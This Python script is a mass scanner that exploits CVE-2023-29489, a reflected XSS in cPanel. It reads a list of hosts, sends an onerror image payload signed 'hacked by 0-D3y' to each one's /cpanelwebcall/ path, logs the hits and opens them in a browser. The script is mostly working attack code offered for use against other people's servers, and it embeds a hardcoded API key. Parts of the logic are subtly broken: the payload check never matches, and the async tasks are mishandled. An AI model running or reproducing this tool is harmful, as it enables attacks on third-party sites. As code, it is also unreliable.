import shodan
import aiohttp
import asyncio
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import platform
import socket
import webbrowser
import pyfiglet
from concurrent.futures import ThreadPoolExecutor

YE_X = 'tt2P5vHq83hdJTG69YK9ffdsZLboHqquDd1t'

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
MAGENTA = "\033[35m"
WHITE = "\033[37m"
RESET = "\033[0m"

if platform.system() == 'Windows':
    os.system(f'title Exploit XSS CVE-2023-29489  - By 0-D3y')

not_exploit = 0
exploit = 0
error_connect = 0

def logo_start():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    logo = pyfiglet.figlet_format("CVE-2023-29489", font="slant")
    print(f"{RED}{logo}{RESET}")
    print(f"{YELLOW}                             By : Mr.Sami{RESET}\n")

def search_cpanel_hosts(api_key):
    hosts = input(f"\n\n{RED}╔═══[ ENTER URL LIST ]\n╚══>>>  {RESET}")
    with open(hosts, 'r') as file_site:
        for host in file_site:
            host = host.strip().replace("https://", "").replace("http://", "").replace("/", "")
            if host:
                yield host

async def test_xss(session, url):
    hacked = """/cpanelwebcall/<img%20src=x%20onerror="prompt('0-D3y')">hacked%20by%200-D3y"""
    xss_url = urljoin(url, hacked)
    try:
        async with session.get(xss_url, ssl=False, timeout=5) as response:
            html = await response.text()
            soup = BeautifulSoup(html, 'html.parser')
            img_tags = soup.find_all('img', src='x')
            for img_tag in img_tags:
                if img_tag.get('onerror') == "prompt(0-D3y)":
                    return True
    except:
        pass
    return False

async def process_host(session, host):
    global exploit, not_exploit, error_connect
    ip = socket.gethostbyname(host)
    for protocol in ['http', 'https']:
        url = f'{protocol}://{host}'
        if await test_xss(session, url):
            print(f'{MAGENTA}[+]{GREEN} Exploit XSS >>>{WHITE} {url} ~ {ip}{RESET}')
            exploit += 1
            with open("CVE-2023-29489.txt", "a") as xss_file:
                xss_file.write(f"{url}/cpanelwebcall/<img%20src=x%20onerror=\"prompt('0-D3y')\">hacked%20by%200-D3y\n")
            webbrowser.open(f"{url}/cpanelwebcall/<img%20src=x%20onerror=\"prompt('0-D3y')\">hacked%20by%200-D3y")
        else:
            print(f'{MAGENTA}[+]{RED} Not Exploit >>>{WHITE} {url} ~ {ip}{RESET}')
            not_exploit += 1
        if platform.system() == 'Windows':
            os.system(f'title Exploit XSS - ({exploit}) Not Exploit - ({not_exploit}) Error - ({error_connect})  - By 0-D3y')

async def main(api_key):
    logo_start()
    async with aiohttp.ClientSession() as session:
        with ThreadPoolExecutor(max_workers=20) as executor:
            loop = asyncio.get_event_loop()
            tasks = []
            for host in search_cpanel_hosts(api_key):
                tasks.append(loop.run_in_executor(executor, process_host, session, host))
            await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main(YE_X))
